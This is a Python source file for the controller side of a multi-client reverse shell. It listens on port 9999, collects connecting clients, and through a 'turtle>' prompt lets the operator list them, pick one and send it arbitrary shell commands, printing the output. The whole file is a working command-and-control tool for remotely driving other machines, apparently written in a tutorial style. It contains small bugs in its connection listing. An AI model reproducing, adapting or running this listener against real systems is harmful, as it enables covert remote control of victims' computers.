import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# Create a socket (connect 2 computers)
def create_socket():
    try:
        global host
        global port 
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Error: " + str(msg) + "\n" + "Retrying.......")
        bind_socket()

# Handling connections from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted
def accept_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1)                # prevents timeout

            all_connections.append(connection)
            all_addresses.append(address)

            print("Connection has been established: " + address[0])

        except:
            print("Error accepting connections")


# 2nd Thread Function
# 1) See all clients
# 2) Select a client
# 3) Send commands to the connected client
# Interactive Prompt for sending commands

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        
        elif 'select' in cmd:
            connection = get_target(cmd)
            if connection is not None:
                send_target_commands(connection)
        
        else:
            print("Comamnd Not Recognized")


# Display all current active connections with the clients
def list_connections():
    results = ''

    for i, connection in enumerate(all_connections):
        try:
            connection.send(str.encode('   '))
            connection.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results = str(i) + "IP: " + str(all_addresses[i][0]) + "PORT: " + str(all_addresses[i][1]) + "\n"
    print("---- CLIENTS ----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ','') # target = ID
        target = int(target)
        connection = all_connections[target]
        print("You are now connected to: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + ">", end="")
        return connection

    except:
        print("Selection not valid")
        return None
    
# Send commands to a client
def send_target_commands(connection):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                connection.send(str.encode(cmd))
                client_response = str(connection.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # thread ends when program ends
        t.start()

# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connection()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()